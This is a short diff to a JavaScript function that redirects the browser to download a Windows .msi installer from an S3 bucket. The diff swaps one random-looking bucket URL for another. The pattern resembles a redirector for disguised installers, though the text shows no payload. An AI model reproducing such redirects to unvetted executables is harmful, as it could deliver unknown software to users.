@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://gg604.s3.ap-southeast-1.amazonaws.com/MSTm_x64.msi";
+	var url="https://1tms11.s3.ap-southeast-2.amazonaws.com/1tms.msi";
 	window.location=url;
 }
